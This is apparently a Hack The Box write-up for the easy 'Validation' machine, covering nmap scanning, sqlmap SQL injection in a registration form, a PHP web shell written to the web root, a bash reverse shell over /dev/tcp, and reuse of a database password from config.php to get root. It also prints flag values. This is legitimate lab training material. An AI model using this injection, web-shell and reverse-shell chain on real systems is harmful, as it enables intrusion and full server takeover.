# Target
| Category          | Details                                                      |
|-------------------|--------------------------------------------------------------|
| 📝 **Name**       | [Validation](https://app.hackthebox.com/machines/Validation) |  
| 🏷 **Type**       | HTB Machine                                                  |
| 🖥 **OS**         | Linux                                                        |
| 🎯 **Difficulty** | Easy                                                         |
| 📁 **Tags**       | SQLi, sqlmap file upload, password reuse                     |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-16 19:48 +0200
Nmap scan report for 10.129.29.79
Host is up (0.060s latency).
Not shown: 65522 closed tcp ports (reset)
PORT     STATE    SERVICE        VERSION
22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 d8:f5:ef:d2:d3:f9:8d:ad:c6:cf:24:85:94:26:ef:7a (RSA)
|   256 46:3d:6b:cb:a8:19:eb:6a:d0:68:86:94:86:73:e1:72 (ECDSA)
|_  256 70:32:d7:e3:77:c1:4a:cf:47:2a:de:e5:08:7a:f8:7a (ED25519)
80/tcp   open     http           Apache httpd 2.4.48 ((Debian))
|_http-server-header: Apache/2.4.48 (Debian)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
4566/tcp open     http           nginx
|_http-title: 403 Forbidden
5000/tcp filtered upnp
5001/tcp filtered commplex-link
5002/tcp filtered rfe
5003/tcp filtered filemaker
5004/tcp filtered avt-profile-1
5005/tcp filtered avt-profile-2
5006/tcp filtered wsm-server
5007/tcp filtered wsm-server-ssl
5008/tcp filtered synapsis-edge
8080/tcp open     http           nginx
|_http-title: 502 Bad Gateway
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.23 seconds
```

#### Capture register user raw HTTP request
Request captured with BurpSuite.
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ cat <<'EOF'> register.http
POST / HTTP/1.1
Host: 10.129.29.173
Content-Length: 32
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://10.129.29.173
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://10.129.29.173/
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=john.doe&country=Poland
EOF
```

#### Use `sqlmap` enumerate target using captured HTTP request
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ sqlmap -r register.http --batch --risk 3 --level 5
<SNIP>
sqlmap identified the following injection point(s) with a total of 1275 HTTP(s) requests:
---
Parameter: country (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=john.doe&country=Poland%' AND 8663=(SELECT (CASE WHEN (8663=8663) THEN 8663 ELSE (SELECT 6770 UNION SELECT 8620) END))-- YNRo

    Type: error-based
    Title: MySQL OR error-based - WHERE or HAVING clause (FLOOR)
    Payload: username=john.doe&country=-2293%' OR 1 GROUP BY CONCAT(0x716a6a7171,(SELECT (CASE WHEN (9071=9071) THEN 1 ELSE 0 END)),0x71706a7a71,FLOOR(RAND(0)*2)) HAVING MIN(0)#

    Type: UNION query
    Title: Generic UNION query (52) - 1 column
    Payload: username=john.doe&country=Poland%' UNION ALL SELECT CONCAT(0x716a6a7171,0x42747a626f6d667878684f507665745847715a57545a756f696d6869467a5177414c765051746577,0x71706a7a71)-- -
---
[16:56:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian 11 (bullseye)
web application technology: Apache 2.4.48, PHP 7.4.23
back-end DBMS: MySQL (MariaDB fork)
<SNIP>
```

#### Use `sqlmap` to upload command execution `.php` script
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ echo '<?php system($_GET["cmd"]); ?>' > cmd.php && \
sqlmap -r register.http --batch --risk 3 --level 5 --file-dest=/var/www/html/cmd.php --file-write=cmd.php
<SNIP>
[16:59:55] [INFO] the local file 'cmd.php' and the remote file '/var/www/html/cmd.php' have the same size (31 B)
<SNIP>
```

#### Confirm `cmd.php` is operational
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ curl http://$TARGET/cmd.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Start `nc` to listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
```

#### Spawn reverse shell connection using 
```
┌──(magicrc㉿perun)-[~/attack/HTB Validation]
└─$ CMD=$(echo "/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'" | jq -sRr @uri) && \
curl http://$TARGET/cmd.php?cmd=$CMD
```

#### Confirm foothold gained
```
connect to [10.10.16.193] from (UNKNOWN) [10.129.29.173] 38440
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@validation:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### Capture user flag
```
www-data@validation:/$ cat /home/htb/user.txt 
847a1d40b847fbe6b888cf8b81010cbe
```

### Root flag

#### Discover MySQL password in `/var/www/html/config.php`
```
www-data@validation:/$ cat /var/www/html/config.php 
<?php
  $servername = "127.0.0.1";
  $username = "uhc";
  $password = "uhc-9qual-global-pw";
  $dbname = "registration";

  $conn = new mysqli($servername, $username, $password, $dbname);
?>
```

#### Reuse discovered password to gain access as `root`
```
www-data@validation:/$ su 
Password: 
root@validation:/# id
uid=0(root) gid=0(root) groups=0(root)
```

#### Capture root flag
```
root@validation:/# cat /root/root.txt 
3c856966083122d6700ca32e0c2639ca
```
